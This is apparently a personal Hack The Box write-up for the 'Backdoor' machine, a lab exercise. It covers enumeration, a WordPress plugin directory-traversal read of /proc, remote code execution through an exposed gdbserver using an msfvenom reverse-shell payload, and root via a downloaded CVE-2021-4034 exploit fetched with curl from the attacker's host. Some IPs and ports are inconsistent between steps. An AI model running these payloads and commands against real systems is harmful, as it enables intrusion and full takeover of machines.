---
title: backdoor
layout: base.njk
description: >
  A short description of page
tags:
  - post
  - hackTheBoxPost
---
# Introduction
This box prooved to be quite intresting, it teaches you different techniques whithin directory traversal, remote gdb and finally a traditional privesc. I do reccomend this box as a cool way to get to know better tools, but I also have to add that it might be annoying to do becuase of the initial foothold might be one user per session.

# Enumeration
First I start with a nmap scan. It doesn't revewal anything out of the usual, I find three ports, 22, 80 and 1337.
I'm a little unsure what I can use the 1337 port for yet so i try to connect and see if I get any errors.
## <! -- > INSERT NMAP SCAN RESULTS
```bash
nc -nv 10.10.11.143 1337
CONNECTED
ls
pwd
whoami
```
Ok, so the port is open and I can connect, but it isn't giving me any feedback. So I'll let that be for now.
Next I add backdoor.htb as an alias to 10.10.11.143 just to make sure there isn't any virtual routing that is happening so I can detect that too. As my previous writeups say, you do that by adding the ip and alias to `/etc/hosts`. After that I start a dirb scan to check out the results.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Backdoor]                                
└─$ dirb http://backdoor.htb                                                    
-----------------                                                      
DIRB v2.22                                                    
By The Dark Raver                                                    
-----------------               
START_TIME: Fri Feb 25 14:11:16 2022
URL_BASE: http://backdoor.htb/ 
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                   
GENERATED WORDS: 4612                          
---- Scanning URL: http://backdoor.htb/ ----                    
+ http://backdoor.htb/index.php (CODE:301|SIZE:0)                
+ http://backdoor.htb/server-status (CODE:403|SIZE:277)           
==> DIRECTORY: http://backdoor.htb/wp-admin/                       
==> DIRECTORY: http://backdoor.htb/wp-content/                     
==> DIRECTORY: http://backdoor.htb/wp-includes/                  
+ http://backdoor.htb/xmlrpc.php (CODE:405|SIZE:42)             
---- Entering directory: http://backdoor.htb/wp-admin/ ---- 
+ http://backdoor.htb/wp-admin/admin.php (CODE:302|SIZE:0)          
==> DIRECTORY: http://backdoor.htb/wp-admin/css/                
==> DIRECTORY: http://backdoor.htb/wp-admin/images/               
==> DIRECTORY: http://backdoor.htb/wp-admin/includes/          
+ http://backdoor.htb/wp-admin/index.php (CODE:302|SIZE:0)             
==> DIRECTORY: http://backdoor.htb/wp-admin/js/                  
==> DIRECTORY: http://backdoor.htb/wp-admin/maint/                
==> DIRECTORY: http://backdoor.htb/wp-admin/network/           
==> DIRECTORY: http://backdoor.htb/wp-admin/user/     
---- Entering directory: http://backdoor.htb/wp-content/ ----
+ http://backdoor.htb/wp-content/index.php (CODE:200|SIZE:0)       
==> DIRECTORY: http://backdoor.htb/wp-content/plugins/             
==> DIRECTORY: http://backdoor.htb/wp-content/themes/               
==> DIRECTORY: http://backdoor.htb/wp-content/upgrade/                               
==> DIRECTORY: http://backdoor.htb/wp-content/uploads/   
```
So there are a lot of results here, after some manual enumeration, I will point out three results:
http://backdoor.htb/wp-admin/
http://backdoor.htb/wp-admin/maint/
http://backdoor.htb/wp-content/plugins/

Wp-admin results in a login page, so therefore I try to enumerate the version and start hydra to try to crack the password.
Further the mainainage page seems to be accessable by everyone, but it doesn't look like we can maintain anything. Therefore it's kind of useless for now.
But the last page shows what kind of plugins are installed. Here I found a ebook reader. This particular version is vulnerable to directory traversal. So we are able to read things from the host system, but we can't upload anything. We are still stuck at enumeration.
Here is a link to the exploit-db entry that was used. Without reading too much into the actual code, it seems like the ebook reader that is vulnerable doesn't sanitize the userinput, and just looks for files that are requested. So by adding `../../../` it looks in the ebook directory, and then recives three path changes. Therefore it looks like a simplified version of `cat /var/www/html/wp/plugins/ebook/books/../../../wp-config.php` = `cat /var/www/html/wp/wp-config.php` (the path is probably wrong but it looks something like that).
https://www.exploit-db.com/exploits/39575

# Modifing the enumeration tools
To automate the enumprocess we can use this script and modify it to suit our needs.
https://github.com/mthbernardes/LFI-Enum

By using that script we can read out common files like /etc/passwd, /etc/crontab, /etc/issue. Further we get information about it's internal network settings and processes.
What really stood out here was the running processes.
Before we dive in to what is interesting, we should briefly talk about how we can read processes. Becuase Linux is built around the idea that everything is a file. So even if a process is a script or program running, it create a file entry in /proc/ and gives it a name according to the process id. Therefore a process that is started with PID 1547, it will show up as a folder /proc/1547 with information about the process.
So the enumeration of processes has to be done by either doing `cat /proc/$pid/cmdline` (this works if the host operating system knows all the args), or by doing `/proc/$pid/comm`(A brief explanation is given ![here](https://unix.stackexchange.com/questions/22121/what-do-the-brackets-around-processes-mean)).


So on to the script.
The script first checks how many PID there is, and after that it manually bruteforce cats every number from 0 - Max number of PID. This proves one problem, if it gets a NULL match, the webpage will still send an empty string that looks like this `!!!<----- ADD EMPTY SCRIPT LINE HERE>`. Therefore you need to add that filter to sanitize your output.
```bash
PID: 809        ../../../../../../../proc/809/cmdline../../../../../../../proc/809/cmdline../../../../../../../proc/809/cmdline/bin/sh while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done <script>win
dow.close()</script>                                                                                                                                                                                                                        
PID: 815        ../../../../../../../proc/815/cmdline../../../../../../../proc/815/cmdline../../../../../../../proc/815/cmdline/bin/sh while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done <script>wind$
w.close()</script>
```

By looking at the results we find these two `bin/sh while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done` and `/bin/sh while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done`. The screen -dmS could be a possible privesc route later, but for now it seems like it lets gdb set up a listener on port 1337. So now we know what program we need to connect to it!

# The exploit for initial foodhold
For those who don't know, gdb is the Gnu project debugger. The program lets you attach other programs to it and offers tools to read out the memory registers and what kind of operations are being sent to the processer on a assembly level. It also has functionality to allow debugging over network. So my guess here is that they set up a gdb server to let others remotely debug programs. How this can be abused though is by creating a malicious payload and letting the debugger run that code. The entire purpose of the debugger is to run code, so this should be relativly easy. A word of caution though, create your payload to resemble the target operating system and you should give it a unique name. If not your initial foothold could be overwritten by others or your code will not run at all. We know it's a linux system through the nmap scan, so this should be easy to pass on to the metasploit framework. For more detailed steps or information, please check out theese two links.
https://sourceware.org/gdb/onlinedocs/gdb/Server.html
https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver
So lets create the payload
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o plsRunMe.elf
chmod +x plsRunMe.elf
gdb plsRunMe.elf
# Set remote debuger target
target extended-remote 10.10.10.11:1337
# Upload elf file
remote put plsRunMe.elf plsRunMe.elf
# Set remote executable file
set remote exec-file /home/user/plsRunMe.elf
# Execute reverse shell executable
run
```
```bash
(gdb) target extended-remote 10.10.11.125:1337
`target:/home/user/plsRunMe.elf' has disappeared; keeping its symbols.
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
(gdb) remote put plsRunMe.elf plsRunMe.elf
Successfully sent file "plsRunMe.elf".
(gdb) set remote exec-file /home/user/plsRunMe.elf
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
`target:/home/user/plsRunMe.elf' has disappeared; keeping its symbols.
Starting program:  
Reading /home/user/plsRunMe.elf from remote target...
Reading /home/user/plsRunMe.elf from remote target...
Reading symbols from target:/home/user/plsRunMe.elf...
(No debugging symbols found in target:/home/user/plsRunMe.elf)

----------------------------------------------

#Our reverse shell
┌──(kali㉿kali)-[~/Documents/HTB/Backdoor]
└─$ nc -nvlp 6969
listening on [any] 6969 ...
connect to [10.10.14.231] from (UNKNOWN) [10.10.11.125] 38176 

ls
plsRunMe.elf
revshell.elf
user.txt

whoami
user

#Success we got shell, but it kind of sucks, so lets spawn a better shell via python
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/sh")'
$
#Good enough
```

# Privesc enumeration
Allright, so we have shell, so here are my standard steps I do when I get shell:
- Whoami?
- Whats in the `/home/user/` directory?
- Is there any hashed passwords hashed in the `/etc/passwd` and can I edit it?
- Is there any silly setuid files?
- Transfer and run linpeas.sh

There are other things I would check but I'm far to lazy, if the first 4 don't yield anything interesting, I'm going to go for linpeas and automate the enumeration. Linpeas checks all this, but I find it easier to just use those two minutes first to check for the obvious ones.
To save you the time, there was nothing particulary interesting, the screen output from earlier is a possible vector but I wasn't really sure how that would work. The output from linpeas showed me that the sudo version was vulnerable, and I have previously successfully used this specific privesc code before. It was easier than finding the syntax for screen.
```bash
# The screen process that was being created every one second.
root         809  0.0  0.0   2608  1652 ?        Ss   11:47   0:14      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done

#The output from linpeas
╔══════════╣ Sudo version 
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31
Vulnerable to CVE-2021-4034 
```

# Privesc
So googling the cve gave me a code from this github page: https://www.exploit-db.com/exploits/50689

It had three files, evil-so.c, exploit.c and makefile. Just transfer the three and you're good to go.

```bash
$ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   873
$ curl http://10.10.14.231:8000/exploit.c -o exploit.c
curl http://10.10.14.231:8000/exploit.c -o exploit.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   555  100   555    0     0   2747      0 --:--:-- --:--:-- --:--:--  2747
$ curl http://10.10.14.231:8000/makefile -o makefile
curl http://10.10.14.231:8000/makefile -o makefile
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   148  100   148    0     0    740      0 --:--:-- --:--:-- --:--:--   740
$ make                                 
make
/bin/sh: 15: make: not found
```
Seriously? Make isn't installed, ohh well, lets just transfer the finished product. So I make it on my kali client and just transfer it.
```bash
$ curl http://10.10.14.231:8000/exploit -o exploit
curl http://10.10.14.231:8000/exploit -o exploit
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16176  100 16176    0     0  53562      0 --:--:-- --:--:-- --:--:-- 53562
$ curl http://10.10.14.231:8000/evil.so -o evil.so
curl http://10.10.14.231:8000/evil.so -o evil.so
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15584  100 15584    0     0  51432      0 --:--:-- --:--:-- --:--:-- 51263
$ ./exploit
./exploit
# whoami
whoami
root
```
:space_invader:
